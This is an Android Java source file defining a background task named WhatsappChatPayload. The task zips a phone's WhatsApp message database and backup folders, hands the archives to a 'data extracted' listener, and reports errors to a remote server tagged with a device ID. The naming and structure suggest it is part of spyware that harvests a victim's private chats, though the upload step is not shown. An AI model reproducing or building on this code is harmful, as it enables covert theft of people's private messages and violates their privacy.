package com.aigs.serviceone.payload;

import android.content.Context;
import android.os.AsyncTask;

import com.aigs.serviceone.helpers.WatsappTextExtractionListner;
import com.aigs.serviceone.util.ZipUtils;
import com.example.logshandler.starter.Logs;
import com.example.uniqueidmanager.UniqueId;

import java.io.File;
import java.lang.ref.WeakReference;

public class WhatsappChatPayload extends AsyncTask<String, Integer, String> {

    WeakReference<Context> contextWeakReference;
    WatsappTextExtractionListner watsappTextExtractionListner;
    int count = 0;

    public WhatsappChatPayload(Context context) {
        this.contextWeakReference = new WeakReference<>(context);
    }

    public WhatsappChatPayload setWatsappTextExtractionListner(WatsappTextExtractionListner watsappTextExtractionListner) {
        this.watsappTextExtractionListner = watsappTextExtractionListner;
        return this;
    }

    @Override
    protected String doInBackground(String... strings) {
        try {

            File file = new File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Databases/");
            File settings = new File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Backups/");

            ZipUtils.getInstance().setZipListener(this::updateProgress).zipDirectory(file, "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Databases.zip");


            ZipUtils.getInstance().setZipListener(this::updateProgress).zipDirectory(settings, "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Backups.zip");

        }catch (Exception e){
            Logs.pushLogsToServer("[ERROR]: "+e.getMessage(), UniqueId.initialize(contextWeakReference.get()).getUUID());

        }

        return null;
    }

    private void updateProgress() {
        count++;
        if (count == 2){
            watsappTextExtractionListner.onDataExtracted(new File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Databases.zip"),
                    new File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Backups.zip"));
        }

    }
}
